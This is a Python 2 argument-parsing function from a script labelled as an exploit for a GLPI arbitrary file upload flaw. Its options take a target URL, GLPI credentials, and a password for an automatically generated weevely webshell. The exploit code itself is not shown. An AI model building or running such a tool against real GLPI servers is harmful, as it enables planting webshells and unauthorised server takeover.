
import argparse
import sys


def ParseOpt(argv):
	parser = argparse.ArgumentParser(description='Exploit for GLPI Arbitrary File Upload.',prog=argv[0])
	parser.add_argument('url', metavar='URL', type=str, help='GLPi Url')
	parser.add_argument('-u', metavar='USER',required=True, type=str, help='Username for GLPi')
	parser.add_argument('-p', metavar='PASSWORD',required=True, type=str, help='Password for GLPi')
	parser.add_argument('-s','--shell',nargs=1, metavar='PASSWORD',type=str,default='$3cr3t', help='Automatic webshell generator protected with <password> (weevley needed)')
	parser.add_argument('--nc',action='store_true', help='Disable certificate verification')
	t=parser.parse_args(argv[1:])
	if t.url[-1]=='/':
		t.url=t.url[:-1]
	print t
	return t
